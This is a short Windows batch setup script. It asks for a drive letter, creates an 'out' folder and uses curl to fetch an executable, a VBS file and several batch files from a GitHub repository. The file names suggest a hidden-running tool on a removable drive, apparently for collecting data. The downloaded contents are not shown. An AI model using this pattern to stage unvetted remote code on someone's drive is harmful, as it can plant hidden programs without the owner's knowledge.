@echo off
wmic logicaldisk get name, description
set /p drive="Please type the drive letter with colon ( ex D: ) you would like to setup the script on: "
%drive%
mkdir out
curl -o invis.vbs https://raw.githubusercontent.com/Th3SnowyOwl/batchscripts/main/invis.vbs
curl -o RemoveDrive.exe https://raw.githubusercontent.com/Th3SnowyOwl/batchscripts/main/RemoveDrive.exe
curl -o nay.bat https://raw.githubusercontent.com/Th3SnowyOwl/batchscripts/main/nay.bat
curl -o eject.bat https://raw.githubusercontent.com/Th3SnowyOwl/batchscripts/main/eject.bat
curl -o run.bat https://raw.githubusercontent.com/Th3SnowyOwl/batchscripts/main/run.bat
